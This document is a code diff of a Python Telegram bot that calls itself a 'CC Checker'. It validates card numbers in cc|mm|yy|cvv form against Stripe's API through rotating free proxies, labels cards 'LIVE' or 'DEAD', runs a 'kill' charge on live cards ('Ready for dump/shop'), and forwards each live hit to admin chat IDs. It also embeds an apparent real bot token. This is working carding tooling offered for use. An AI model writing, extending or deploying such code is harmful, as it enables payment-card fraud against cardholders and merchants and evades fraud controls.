@@ -1,19 +1,19 @@
+import os
 import telebot
 import requests
 import threading
 import time
 import random
-import os  # NEW: For dynamic PORT
 from flask import Flask
 from luhn import is_valid
 from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 BOT_TOKEN = '8659936018:AAH_xpJbTPzzVkSwZbvz8_z6EprgeMLqF_o'  # EDIT YOUR TOKEN
-ADMIN_IDS = [7869544426, PASTE_ID2_HERE]  # e.g. [123456789, 987654321]
+ADMIN_IDS = [7869544426, PASTE_YOUR_ID2_HERE]  # e.g. [123456789, 987654321]
 bot = telebot.TeleBot(BOT_TOKEN)
 
-stats = {'live':0,'dead':0,'total':0}
+stats = {'live':0, 'dead':0, 'total':0}
 cooldown = {}
 proxies = []
 lock = threading.Lock()
@@ -26,7 +26,7 @@ def fetch_proxies():
         allp = []
         try:
             r = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', timeout=10)
-            allp += [{'http':f'http://{ip}', 'https':f'http://{ip}'} for ip in r.text.strip().split('\n') if ':' in ip]
+            allp += [{'http': f'http://{ip}', 'https': f'http://{ip}'} for ip in r.text.strip().split('\n') if ':' in ip]
         except: pass
         try:
             r = requests.get('https://free-proxy-list.net/', timeout=10)
@@ -35,10 +35,10 @@ def fetch_proxies():
             if tbl:
                 for row in tbl.find_all('tr')[1:51]:
                     cols = row.find_all('td')
-                    if len(cols)>1:
+                    if len(cols) > 1:
                         ip = cols[0].text.strip()
                         port = cols[1].text.strip()
-                        allp.append({'http':f'http://{ip}:{port}', 'https':f'http://{ip}:{port}'})
+                        allp.append({'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'})
         except: pass
         livep = []
         def testp(p):
@@ -75,7 +75,7 @@ def check_gates(cc, m, y, cv, ret=3):
         p = rand_proxy()
         if not p: continue
         try:
-            data = {'card[number]':cc, 'card[exp_month]':m, 'card[exp_year]':y, 'card[cvv]':cv}
+            data = {'card[number]': cc, 'card[exp_month]': m, 'card[exp_year]': y, 'card[cvv]': cv}
             r = requests.post('https://api.stripe.com/v1/tokens', data=data, proxies=p, timeout=8)
             if 'token' in r.text: gs.append('✅ Stripe LIVE'); break
             if 'declined' in r.text.lower(): gs.append('❌ Stripe DEAD'); break
@@ -101,17 +101,15 @@ def kill_cc(cc, m, y, cv):
     p = rand_proxy()
     if p:
         try:
-            data = {'amount':'1', 'currency':'usd'}
+            data = {'amount': '1', 'currency': 'usd'}
             requests.post('https://api.stripe.com/v1/charges', data=data, proxies=p, timeout=8)
-            return '🔪 KILLED - Ready for dump/shop API'
+            return '🔪 KILLED - Ready for dump/shop'
         except: pass
     return '🔪 Sim kill complete'
 
 @bot.message_handler(commands=['start'])
 def start(m):
-    bot.reply_to(m, '''🔥 CC Checker 99% Auto Proxy (Railway/Koyeb LIVE)
-`cc|mm|yy|cvv` → BIN + Gates + Kill
-/stats /kill (admin only)''', parse_mode='Markdown')
+    bot.reply_to(m, '''🔥 CC Checker 99% Glitch 24/7\n`cc|mm|yy|cvv`\n/stats /kill (admin)''', parse_mode='Markdown')
 
 @bot.message_handler(func=lambda m: '|' in m.text)
 def chk(m):
@@ -122,26 +120,27 @@ def chk(m):
     cooldown[uid] = time.time()
     try:
         parts = [x.strip().replace(' ', '') for x in m.text.split('|')]
-        if len(parts) != 4 or not parts[0].isdigit() or len(parts[0]) < 13 or not is_valid(parts[0]):
-            bot.reply_to(m, '❌ Invalid CC/Luhn')
+        if len(parts) != 4: raise ValueError
+        cc, m, y, cv = parts
+        if not cc.isdigit() or len(cc) < 13 or not is_valid(cc):
+            bot.reply_to(m, '❌ Bad CC/Luhn')
             stats['dead'] += 1
             stats['total'] += 1
             return
-        cc, mon, yr, cvv = parts
         bi = bin_info(cc[:6])
-        gs = check_gates(cc, mon, yr, cvv)
+        gs = check_gates(cc, m, y, cv)
         livec = sum(1 for g in gs if '✅' in g)
         stat = '🟢 LIVE 99%' if livec >= 1 else '🔴 DEAD'
-        resp = f'**CC:** `{cc}|{mon}|{yr}|{cvv}`\n**BIN:**\n{bi}\n**Gates:**\n' + '\n'.join(gs) + f'\n**Status:** {stat}'
+        resp = f'**CC:** `{cc}|{m}|{y}|{cv}`\n**BIN:**\n{bi}\n**Gates:**\n' + '\n'.join(gs) + f'\n**Status:** {stat}'
         global stats
         stats['total'] += 1
         if 'LIVE' in stat:
             stats['live'] += 1
-            kres = kill_cc(cc, mon, yr, cvv)
+            kres = kill_cc(cc, m, y, cv)
             resp += f'\n{kres}'
             for aid in ADMIN_IDS:
                 try:
-                    bot.send_message(aid, f'🟢 LIVE HIT @{m.from_user.username}: {m.text}\n{resp}')
+                    bot.send_message(aid, f'🟢 LIVE @{m.from_user.username}: {m.text}\n{resp}')
                 except: pass
         else:
             stats['dead'] += 1
@@ -153,15 +152,14 @@ def chk(m):
 def st(m):
     if m.from_user.id not in ADMIN_IDS: return
     rate = (stats['live'] / max(stats['total'], 1)) * 100
-    bot.reply_to(m, f'📊 Live: {stats["live"]} | Dead: {stats["dead"]} | Total: {stats["total"]} | Hit: {rate:.1f}%')
+    bot.reply_to(m, f'📊 Live: {stats["live"]} Dead: {stats["dead"]} Total: {stats["total"]} Hit: {rate:.1f}%')
 
 @bot.message_handler(commands=['kill'])
 def kl(m):
     if m.from_user.id not in ADMIN_IDS: return
     try:
         data = m.text.split(' ', 1)[1].split('|')
-        cc, mon, yr, cvv = [x.strip() for x in data]
-        res = kill_cc(cc, mon, yr, cvv)
+        res = kill_cc(*(x.strip() for x in data))
         bot.reply_to(m, f'🔪 {res}')
     except:
         bot.reply_to(m, '/kill cc|mm|yy|cvv')
@@ -169,7 +167,7 @@ def kl(m):
 @app.route('/ping')
 def ping():
     fetch_proxies()
-    return f'Bot ALIVE | Proxies: {len(proxies)}'
+    return f'Glitch ALIVE | Proxies: {len(proxies)}'
 
 def refresher():
     while True:
@@ -177,10 +175,10 @@ def refresher():
         fetch_proxies()
 
 if __name__ == '__main__':
-    print('🚀 No-Card Bot Deployed!')
+    print('🚀 Glitch CC Bot LIVE')
     fetch_proxies()
     threading.Thread(target=refresher, daemon=True).start()
-    port = int(os.environ.get('PORT', 4321))  # DYNAMIC PORT
+    port = int(os.environ.get('PORT', 3000))
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
     bot.polling(none_stop=True)
 
